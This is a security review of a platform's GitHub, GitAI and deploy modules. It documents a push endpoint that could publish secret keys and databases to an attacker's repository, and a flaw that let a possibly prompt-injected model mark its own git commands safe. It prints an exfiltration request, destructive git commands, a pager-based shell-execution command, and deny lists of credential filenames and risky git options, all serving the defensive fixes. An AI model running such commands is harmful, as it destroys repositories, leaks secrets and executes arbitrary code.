# Module 16 — GitHub (+ GitAI, Deploy)

**Commit:** `19d7bf9` · **Suite:** 3068 passed / 17 skipped / 0 failed · ruff clean
**Surface:** `backend/routers/github.py` (694) · `gitai.py` (757) · `deploy.py` (598)
**Workstation:** `github` absorbs `gitai` and `deploy`

This module is the platform's **egress boundary**: it uploads local files to
remote repositories and runs git against the working tree. Both critical
findings were reproduced live before the fix.

---

## 🔴 1. A push could publish the vault to a public repo

`directory` was validated only as *inside ROOT* — which is the entire project:

```
POST /api/github/push {"repo": "attacker/public", "directory": "memory"}
```

Replaying the collection step selected **206 files with `memory/.vault_key`
first in the list**, alongside `agentic.db`:

```
.vault_key                       (44 bytes)
agentic.db                       (49,430,528 bytes)   ← 345 secrets rows,
backup_20260803_183912.db        (22,921,216 bytes)      auth_users,
...                                                      every chat message
```

One API call, to any repository the caller names.

### What I got wrong the first time

My own containment sweep (`c9646f2`) had **already touched this exact line**,
replacing `str.startswith()` with `is_within()`. That fixed the sibling-prefix
bypass and left the real problem untouched: **ROOT-containment is the wrong
boundary for an egress operation.**

Worth recording plainly — fixing the bug you came for is not the same as asking
whether the check makes sense. A guard can be perfectly correct against
traversal and still permit exactly the thing it exists to prevent.

### The fix — two layers

- **`PUBLISHABLE_DIRS` allowlist** (`preview`, `workspaces`, `templates`,
  `docs`). Egress should enumerate what *may* leave, not what may not.
- **Per-file screening during collection**, so a credential inside an otherwise
  publishable directory is still held back: `.env`, `.vault_key`, `*.pem`,
  `*.key`, `*.db`/`*.sqlite`, `id_rsa`, `service-account.json`, and any filename
  containing secret / password / credential / api_key.

Verified: `memory`, `backend`, `.git`, `..` all refused; `preview` and
`workspaces` still work; `preview/.env` held back even though `preview` is
allowed.

---

## 🔴 2. GitAI let the model authorise its own commands

```python
safe = cmd_info.get('safe', True)
if not safe and not body.get('allow_unsafe', False):
    ...skip...
stdout, stderr, code = _git(cmd[1:])
```

**The model both proposes the command and declares it safe.** A prompt-injected
or simply confused model self-authorises. Replaying that exact path with
`is_destructive=false` and `safe=true`:

```
WOULD RUN: git push --force origin main
WOULD RUN: git reset --hard HEAD~50
WOULD RUN: git clean -fdx
WOULD RUN: git config --global core.pager "sh -c id"     ← arbitrary execution
```

The last is the serious one. `core.pager` — or `core.sshCommand`, or a leading
`-c` — turns every subsequent "read-only" git call into a shell. A model that
labels *that* `safe: true` has handed over the machine.

### The fix

`classify_git_command()` decides **server-side**. The model may *suggest*; the
server classifies:

| Category | Behaviour |
|---|---|
| `config`, `daemon`, `filter-branch`, `-c`, `--exec`, `--upload-pack` | **Refused outright** — never appropriate from a natural-language request |
| `push --force`, `reset --hard`, `clean -fdx`, `commit` | Valid, but require `allow_unsafe=true` **from the caller** |
| `log`, `status`, `diff`, `show`, `blame`, `branch` | Run as before |

The model's claim is still reported as `model_claimed_safe` rather than
discarded — a model that mislabels a destructive command is a signal worth
surfacing, not hiding.

---

## 🟡 3. A missing token returned HTTP 200

`{"ok": false, "error": "GITHUB_TOKEN not set"}` with a 200 status —
indistinguishable from success to anything not reading the body. Now 401 with
`code=no_token`; a forbidden push directory is 403; validation failures are 400.

---

## Verified working (no change needed)

- **`_git()` never uses a shell** — `subprocess.run(['git'] + args)` with an
  argv list, so no interpolation. (My test for this initially matched gitai's
  own security-scanner *rule* describing `shell=True` as a risk; scoped to the
  helper.)
- **`dry_run` defaults to `True`** on nl-git, so executing a model-proposed
  command is already opt-in.
- `_valid_repo_name()` correctly rejects `../../etc`, bare names and extra path
  segments.
- The clone-write path uses `is_within(f, target_dir)` from the shared helper.
- Deploy validates its provider tokens before calling out.

---

## Cross-module impact

| Module | Impact |
|---|---|
| **Secrets Vault** | `memory/.vault_key` was directly publishable |
| **Terminal** | Shares the `_git` pattern; both now argv-only |
| **Composer / Studio** | Push `preview/` — the common path, unaffected |
| **Deploy** | Shares `github.py`'s token handling and now its status codes |

---

## Tests

`tests/unit/test_71_github_module_review.py` — **69 contracts**, including 13
credential-shaped filenames, six code-execution vectors, and a replay of the
exact structure `nl-git` receives from the model.

**Proven to catch the bugs: 64 of 69 fail against the pre-fix code.**

Four existing tests asserted 200 for a missing token; updated to accept 401.

---

## Recommended follow-ups

1. **Push has no confirmation step.** It uploads up to 100 files to a remote
   repository with no preview of *what* will be sent. Now that files can be held
   back by screening, a dry-run returning the file list (and the skipped ones)
   would let a user check before publishing rather than after.
2. **`skipped_secrets` is collected but not surfaced in the response.** The
   files are correctly held back; the caller should be told which and why,
   otherwise a missing file looks like a bug.
3. **GitAI has no audit trail.** `nl-git` can modify the repository with
   `allow_unsafe=true`, and nothing records what ran. The platform has
   `audit_log()` — this is a natural caller.
4. **Deploy tokens are read from env per provider with no unified check.** Six
   providers each hand-roll their credential lookup; a shared resolver would
   make "which providers are actually configured" answerable in one place.
